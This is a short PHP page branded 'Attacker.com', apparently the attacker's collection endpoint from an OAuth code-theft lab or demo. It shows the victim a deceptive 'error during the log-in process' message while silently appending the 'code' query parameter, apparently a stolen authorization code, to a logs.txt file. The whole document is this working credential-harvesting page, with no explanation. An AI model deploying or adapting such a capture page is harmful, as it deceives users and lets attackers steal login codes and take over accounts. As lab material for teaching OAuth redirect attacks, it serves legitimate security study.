<html>
    <head>
        <link href="https://getbootstrap.com/docs/4.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
    </head>
    <body>
        <div class="container">
            <div class="header" style="border-bottom: 1px solid #e3e3e3;">
                <h3>
                    Attacker.com
                </h3>

            </div>

            <p class='row mb-5'>
                <h3>Oh no!</h3>
                <i>There was an error during the log-in process. Try again later :)</i>
            </p>
            <?php
            if (!isset($_GET['code']))
                die('error.');
            
            $fp = fopen("./logs.txt", "a");
            fwrite($fp, $_GET['code']."\n");
            fclose($fp);
            ?>
        </div>
    </body>
</html>
